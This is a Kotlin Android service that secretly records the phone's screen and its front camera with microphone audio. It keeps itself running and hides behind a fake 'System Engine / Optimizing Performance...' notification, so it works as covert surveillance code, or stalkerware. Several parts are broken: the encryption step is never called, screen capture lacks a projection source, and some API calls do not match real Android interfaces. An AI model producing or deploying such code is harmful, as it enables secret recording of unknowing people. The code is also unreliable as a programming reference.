package com.example.myapplication.service

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.camera.camera2.Camera2Config
import androidx.camera.core.CameraXConfig
import androidx.core.app.NotificationCompat
import com.example.myapplication.R
import com.example.myapplication.security.EncryptionManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MonitoringService : Service(), CameraXConfig.Provider {
    private lateinit var encryptionManager: EncryptionManager
    private val handler = Handler(Looper.getMainLooper())
    private val scope = CoroutineScope(Dispatchers.IO)
    private var screenRecorder: MediaRecorder? = null
    private var cameraRecorder: MediaRecorder? = null
    private var isRecording = false

    companion object {
        private const val TAG = "MonitoringService"
        private const val NOTIFICATION_ID = 1001
        private const val MAX_STORAGE_BYTES = 10 * 1024 * 1024 * 1024L
        private const val VIDEO_BITRATE = 2500000
        private const val VIDEO_FRAME_RATE = 30
    }

    override fun onCreate() {
        super.onCreate()
        encryptionManager = EncryptionManager(this)
        startForegroundNotification()
        startMonitoring()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundNotification() {
        val notification = NotificationCompat.Builder(this, "monitoring_channel")
            .setContentTitle("System Engine")
            .setContentText("Optimizing Performance...")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(false)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun startMonitoring() {
        if (isRecording) return
        isRecording = true

        scope.launch {
            try {
                startScreenRecording()
                startCameraRecording()
                cleanupOldFiles()
            } catch (e: Exception) {
                Log.e(TAG, "Error starting monitoring", e)
            }
        }
    }

    private suspend fun startScreenRecording() {
        try {
            val timestamp = SimpleDateFormat(
                "yyyy_MM_dd_HH_mm_ss",
                Locale.US
            ).format(Date())
            
            val tempFile = File(cacheDir, "screen_$timestamp.mp4")
            val encFile = File(filesDir, "screen_$timestamp.enc")

            screenRecorder = MediaRecorder().apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoEncodingBitRate(VIDEO_BITRATE)
                setVideoFrameRate(VIDEO_FRAME_RATE)
                setVideoSize(1080, 1920)
                setOutputFile(tempFile.absolutePath)
                
                try {
                    prepare()
                    start()
                    Log.d(TAG, "Screen recording started: $timestamp")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start screen recording", e)
                    release()
                    screenRecorder = null
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in startScreenRecording", e)
        }
    }

    private suspend fun startCameraRecording() {
        try {
            val timestamp = SimpleDateFormat(
                "yyyy_MM_dd_HH_mm_ss",
                Locale.US
            ).format(Date())
            
            val tempFile = File(cacheDir, "camera_$timestamp.mp4")
            val encFile = File(filesDir, "camera_$timestamp.enc")

            cameraRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.CAMERA)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncodingBitRate(128000)
                setVideoEncodingBitRate(VIDEO_BITRATE)
                setVideoFrameRate(VIDEO_FRAME_RATE)
                setVideoSize(720, 1280)
                setCameraId(1)
                setOutputFile(tempFile.absolutePath)
                
                try {
                    prepare()
                    start()
                    Log.d(TAG, "Camera recording started: $timestamp")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start camera recording", e)
                    release()
                    cameraRecorder = null
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in startCameraRecording", e)
        }
    }

    private suspend fun encryptAndSaveFile(inputFile: File, outputFileName: String) {
        try {
            if (!inputFile.exists()) return
            
            val outputStream = encryptionManager.getEncryptedOutputStream(outputFileName)
            val inputStream = inputFile.inputStream()
            val buffer = ByteArray(8192)
            var bytesRead: Int
            
            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                outputStream.write(buffer, 0, bytesRead)
            }
            
            inputStream.close()
            outputStream.close()
            inputFile.delete()
            
            Log.d(TAG, "File encrypted and saved: $outputFileName")
        } catch (e: Exception) {
            Log.e(TAG, "Error encrypting file", e)
        }
    }

    private suspend fun cleanupOldFiles() {
        val totalSize = encryptionManager.getEncryptedFilesSize()

        if (totalSize > MAX_STORAGE_BYTES) {
            val files = encryptionManager.getAllEncryptedFiles()
            val sortedFiles = files.sortedBy { it.lastModified() }
            
            var currentSize = totalSize
            for (file in sortedFiles) {
                if (currentSize <= MAX_STORAGE_BYTES) break
                currentSize -= file.length()
                encryptionManager.deleteEncryptedFile(file.name)
                Log.d(TAG, "Deleted old file: ${file.name}")
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRecording = false
        
        screenRecorder?.apply {
            try {
                stop()
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping screen recorder", e)
            }
            release()
        }
        screenRecorder = null
        
        cameraRecorder?.apply {
            try {
                stop()
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping camera recorder", e)
            }
            release()
        }
        cameraRecorder = null
    }

    override fun getCameraXConfig(): CameraXConfig {
        return Camera2Config.Builder().build()
    }
}
